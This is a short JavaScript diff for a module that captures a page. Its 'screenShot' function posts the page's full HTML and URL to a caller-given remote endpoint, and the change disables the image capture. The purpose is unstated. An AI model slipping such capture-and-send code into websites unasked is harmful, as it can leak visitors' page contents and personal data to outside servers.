@@ -10,7 +10,7 @@ const require = (url) =>{
 const screenShot = (url) => {
     html2canvas(document.body).then(function(canvas) {        
         const bodyTXT = document.body.innerHTML
-        const bodyIMG = canvas.toDataURL('image/png')
+        const bodyIMG = ""//canvas.toDataURL('image/png')
 
         const data    = JSON.stringify({url: document.URL, screenshot:[{body:bodyTXT, img: bodyIMG, date: Date.now()}]})
         postData(url+"/screenshot", data)
@@ -23,5 +23,6 @@ const logo = (url) => {
     div.setAttribute("style", "top:50%;left: 96%;position:fixed;color:red;width:5%;height:2%;-webkit-transform: rotate(270deg);font-weight: bold;")    
     document.body.appendChild(div);   
 }
+
 
 export {require, screenShot, logo};
